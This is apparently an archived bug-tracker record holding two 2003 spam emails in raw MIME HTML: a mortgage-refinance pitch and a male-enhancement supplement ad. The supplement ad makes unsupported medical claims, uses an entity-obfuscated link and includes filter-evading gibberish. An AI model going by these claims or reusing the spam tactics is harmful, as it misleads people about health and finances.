                  ...to Lower Payments!</font></td>
              </tr>
            </table>
            <p> 
            <div align=3D"center"><font style=3D"font: 16px Arial, Verdana=
, Helvetica, sans-serif; color: #9A9A9A; font-weight: bold"> 
              <a href=3D"http://transww.com/4/index.asp?RefID=3D427047">Cl=
ick here to utilize our easy Online Inquiry 
              Form.</a></font></div></td>
        </tr>
      </table></td>
    <td width=3D"300" bgcolor=3D"#FFCC00" valign=3D"bottom"><table
width=3D=
"50%" border=3D"0" cellspacing=3D"0" cellpadding=3D"3">
        <tr>
          <td><table width=3D"98%" bgcolor=3D"#FFFFFF" border=3D"0" cellsp=
acing=3D"2" cellpadding=3D"0">
        <tr>
          <td align=3D"right"><font style=3D"font: 11px Arial, Verdana, He=
lvetica, sans-serif; color: #9A9A9A;">copyright =A9 2003 </font></td>
        </tr>
      </table></td>
        </tr>
      </table></td>
    <td bgcolor=3D"#FF9900"> </td>
  </tr>
</table><table width=3D"100%" height=3D"2" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
  <tr> 
    <td width=3D"60"></td>
    <td width=3D"400"></td>
    <td width=3D"300"></td>
    <td></td>
  </tr>
</table>
<table width=3D"100%" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
  <tr> 
    <td width=3D"60" bgcolor=3D"#FFCC00"> </td>
    <td width=3D"400" align=3Dcenter><font style=3D"font: 10px Arial, Verd=
ana, Helvetica, sans-serif; color: #000000; font-weight: normal">If you wo=
uld no longer like to receive our offers, please <A href=3Dhttp://transww.=
com/auto/index.htm>click here</A></font></td>
    <td width=3D"300" bgcolor=3D"#FFCC00"> </td>
    <td bgcolor=3D"#FF9900"> </td>
  </tr>
</table>
</body>
</html>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859=
-1">
</head>

<body><table width=3D"100%" height=3D"30" border=3D"0" cellpadding=3D"0" c=
ellspacing=3D"0">
  <tr> 
    <td width=3D"60" bgcolor=3D"#FFCC00"> </td>
    <td width=3D"400"><table width=3D"100%" border=3D"0" cellspacing=3D"2"=
 cellpadding=3D"2">
  <tr>
          <td><font style=3D"font: 18px Arial, Verdana, Helvetica, sans-se=
rif; color: #FF6600; font-weight: bold">.isnt 
            it time you refinanced your mortgage?..</font></td>
  </tr>
</table>
</td>
    <td width=3D"300" bgcolor=3D"#FFCC00"> </td>
    <td bgcolor=3D"#FF9900"> </td>
  </tr>
</table>
<table width=3D"100%" height=3D"2" border=3D"0" cellspacing=3D"0" cellpadd=
ing=3D"0">
  <tr> 
    <td width=3D"60"></td>
    <td width=3D"400"></td>
    <td width=3D"300"></td>
    <td></td>
  </tr>
</table>
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
  <tr>
    <td width=3D"60" bgcolor=3D"#FFCC00"> </td>
    <td width=3D"400" valign=3D"top"><table width=3D"100%" border=3D"0" ce=
llspacing=3D"2" cellpadding=3D"2">
  <tr>
    <td><font style=3D"font: 13px Arial, Verdana, Helvetica, sans-serif; c=
olor: #4B4B4B; font-weight: bold">Why should you refinance your mortgage?<=
/font><br>
	 <font style=3D"font: 11px Arial, Verdana, Helvetica, sans-serif; color: =
#4B4B4B;">....The lower the interest rate is, the less that it will cost y=
ou to borrow the money. As a general rule, if the interest rate is 1 1/2 p=
oints lower than what you are currently paying, it's time to refinance you=
r mortgage!<br>
            <br>
            Ask one of our loan consultants to compare your expenses for v=
arious loan programs. In most cases you will be eligible for differing loa=
n programs so make sure you consider all of your options before making a c=
hoice.<p></font>
</td>
  </tr>
</table>
</td>
    <td width=3D"300" bgcolor=3D"#FF9900" valign=3D"top"> </td>
    <td bgcolor=3D"#FFCC00"> </td>
  </tr>
</table>
<table width=3D"100%" height=3D"2" border=3D"0" cellspacing=3D"0" cellpadd=
ing=3D"0">
  <tr> 
    <td width=3D"60"></td>
    <td width=3D"400"></td>
    <td width=3D"300"></td>
    <td></td>
  </tr>
</table>
<table width=3D"100%" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
  <tr> 
    <td width=3D"60" bgcolor=3D"#FF9900" valign=3D"bottom" align=3D"right"=
><table width=3D"50%" border=3D"0" cellspacing=3D"0" cellpadding=3D"3">
        <tr>
          <td><table width=3D"98%" bgcolor=3D"#FFFFFF" border=3D"0" cellsp=
acing=3D"0" cellpadding=3D"0">
        <tr>
          <td> </td>
        </tr>
      </table></td>
        </tr>
      </table></td>
    <td width=3D"400" valign=3D"top"><table width=3D"100%" border=3D"0" ce=
llspacing=3D"2" cellpadding=3D"2">
        <tr>
          <td> <table width=3D"80%" align=3D"center" border=3D"0" cellspac=
ing=3D"1" cellpadding=3D"2">
              <tr> 
                <td colspan=3D"2"><font style=3D"font: 26px Arial, Verdana=
, Helvetica, sans-serif; color: #000099; font-weight: bold"> 
                   .regardless of credit!</font></td>
              </tr>
              <tr> 
                <td><font style=3D"font: 12px Arial, Verdana, Helvetica, s=
ans-serif; color: #000000; font-weight: bold">=95 
                  Take advantage of lower interest rates</font></td>
              </tr>
              <tr> 
                <td><font style=3D"font: 12px Arial, Verdana, Helvetica, s=
ans-serif; color: #000000; font-weight: bold">=95 
                  Lower your payments</font></td>
              </tr>
              <tr> 
                <td><font style=3D"font: 12px Arial, Verdana, Helvetica, s=
ans-serif; color: #000000; font-weight: bold">=95 
                  Lenders will compete for your business</font></td>
              </tr>
              <tr> 
                <td colspan=3D"2"><font style=3D"font: 18px Arial, Verdana=
, Helvetica, sans-serif; color: #FF0101; font-weight: bold; text-decoratio=
n: blink;">Lower 
                  Rates Translate...<br>
                                      
                  ...to Lower Payments!</font></td>
              </tr>
            </table>
            <p> 
            <div align=3D"center"><font style=3D"font: 16px Arial, Verdana=
, Helvetica, sans-serif; color: #9A9A9A; font-weight: bold"> 
              <a href=3D"http://transww.com/4/index.asp?RefID=3D427047">Cl=
ick here to utilize our easy Online Inquiry 
              Form.</a></font></div></td>
        </tr>
      </table></td>
    <td width=3D"300" bgcolor=3D"#FFCC00" valign=3D"bottom"><table
width=3D=
"50%" border=3D"0" cellspacing=3D"0" cellpadding=3D"3">
        <tr>
          <td><table width=3D"98%" bgcolor=3D"#FFFFFF" border=3D"0" cellsp=
acing=3D"2" cellpadding=3D"0">
        <tr>
          <td align=3D"right"><font style=3D"font: 11px Arial, Verdana, He=
lvetica, sans-serif; color: #9A9A9A;">copyright =A9 2003 </font></td>
        </tr>
      </table></td>
        </tr>
      </table></td>
    <td bgcolor=3D"#FF9900"> </td>
  </tr>
</table><table width=3D"100%" height=3D"2" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
  <tr> 
    <td width=3D"60"></td>
    <td width=3D"400"></td>
    <td width=3D"300"></td>
    <td></td>
  </tr>
</table>
<table width=3D"100%" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
  <tr> 
    <td width=3D"60" bgcolor=3D"#FFCC00"> </td>
    <td width=3D"400" align=3Dcenter><font style=3D"font: 10px Arial, Verd=
ana, Helvetica, sans-serif; color: #000000; font-weight: normal">If you wo=
uld no longer like to receive our offers, please <A href=3Dhttp://transww.=
com/auto/index.htm>click here</A></font></td>
    <td width=3D"300" bgcolor=3D"#FFCC00"> </td>
    <td bgcolor=3D"#FF9900"> </td>
  </tr>
</table>
</body>
</html>
n9kpccvmfvtp
pibsokhrdqii
djzwaofhdinxhzkg jblyzny

--5.2C_1_AB_CCF08BA--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3473 *
Subject: This can please her more
From: "Teri Rogers" <ynyhz40s@aeiclaimslaw.com>
Date: Sun, 13 Jul 03 20:10:28 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3473 <==
From ynyhz40s@aeiclaimslaw.com Sun Jul 13 17:13:03 2003
Received: from CPE00e018917f22-CM013299903560.cpe.net.cable.rogers.com (CPE00e018917f22-CM013299903560.cpe.net.cable.rogers.com [65.49.34.36])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6DFCsJH011274;
	Sun, 13 Jul 2003 17:12:59 +0200 (MET DST)
Received: from 8n3.fj5za.net [214.248.156.64] by CPE00e018917f22-CM013299903560.cpe.net.cable.rogers.com id <5397228-29226> for <p.dalgaard@biostat.ku.dk>; Sun, 13 Jul 2003 20:10:28 +0500
Message-ID: <l848i89751n7n@ohz6p.cf.8q>
From: "Teri Rogers" <ynyhz40s@aeiclaimslaw.com>
To: p.dalgaard@biostat.ku.dk
Cc: <r-bugs@biostat.ku.dk>, <sr@biostat.ku.dk>
Subject: This can please her more
Date: Sun, 13 Jul 03 20:10:28 GMT
X-Mailer: Microsoft Outlook Express 5.00.2615.200
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary=".1_CC_.BB_48D_8DFCA"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--.1_CC_.BB_48D_8DFCA
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<!-- saved from url=3D(0022)http://internet.e-mail -->
<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;charset=3Diso-8859-=
1">
<table border=3D"1" cellpadding=3D"0" cellspacing=3D"0" style=3D"border-co=
llapse: collapse" bordercolor=3D"#FF0000" width=3D"515" id=3D"AutoNumber2"=
>
  <tr> 
    <td bgcolor=3D"#FFFF00"> 
      <p align=3D"center"><b><font face=3D"Arial"><font face=3D"Arial,Helv=
etica"><b>Iron 
        Man</b> has been featured on over 100 TV News and <br>
        Top Radio stations across America, and we know why...</font> <br>
        <font face=3D"Arial,Helvetica">It REALLY works!</font></font> </b>=
 
    </td>
  </tr>
  <tr> 
    <td> 
      <p align=3D"center"><font face=3D"Verdana" color=3D"#FF0000"><br>
        <a href=3D"http://brandnewsomething.com/h/iron.html">click here no=
w!</a></font></p>
      <div align=3D"center"> 
        <table width=3D"96%" border=3D"0">
          <tr>
            <td width=3D"6%">&nbsp;</td>
            <td width=3D"90%"> 
              <div align=3D"center">
                <p align=3D"center"><font face=3D"Verdana" color=3D"#FF000=
0"><b>FREE 
                  TRIAL OFFFER!<br>
                  </b></font></p>
                <div align=3D"left"> 
                  <ul>
                    <li> <font face=3D"Arial,Helvetica">Dramatically Enhan=
ces Organism</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Number 1 formula fo=
r men</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Boosts Multiple Cli=
maxes.&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">No Negative Side Ef=
fects 
                      (All Natural Ingredients)</font></li>
                    <li><font face=3D"Arial,Helvetica">No Negative Side Ef=
fects 
                      (All Natural Ingredients).&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Boosts Multiple Org=
asms!</font></li>
                    <li><font face=3D"Arial,Helvetica">Does Not Increas</f=
ont><font face=3D"Arial,Helvetica">e 
                      Blood Pressure!&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Increases circulati=
on in 
                      men so erections become firmer.&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Helps men with a se=
xual response 
                      dysfunction, or&nbsp; lack of </font><font face=3D"A=
rial,Helvetica">interest 
                      in sex.&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Clears impotency pr=
oblems.&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Relieves Emotional =
Ups Downs, 
                      and Headaches!</font> </li>
                    <li><font face=3D"Arial,Helvetica">Helps Relieve Prost=
ate Problems.</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Lowers Cholesterol.=
&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Very Affordable Pri=
ce</font> 
                    </li>
                  </ul>
                </div>
                <ul>
                </ul>
                <p align=3D"center"><a href=3D"http://brandnewsomething.co=
m/h/iron.html"><font face=3D"Arial, Helvetica, sans-serif" size=3D"3">Visi=
t 
                  Our Web Site Click Here:<br>
                  Learn about our special offer!.</font><font face=3D"Verd=
ana" size=3D"2">&nbsp;</font> 
                  </a> 
              </div>
            </td>
            <td width=3D"4%">&nbsp;</td>
          </tr>
        </table>
        <p align=3D"center">&nbsp;</p>
      </div>
    </td>
  </tr>
  <tr> 
    <td> 
      <p align=3D"center"><font size=3D"1"> <a href=3D"http://&#66&#117&#1=
21&#104&#103&#72&#78&#111&#87.&#67&#111&#77/remove_page1.html"><font
size=3D=
"2">Click 
        here to stop these notifications</font></a></font> 
    </td>
  </tr>
</table>
<br>
&nbsp;aiyk xb
h
ehmrnkmd h krj b u fllxb
lyuyn

--.1_CC_.BB_48D_8DFCA--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
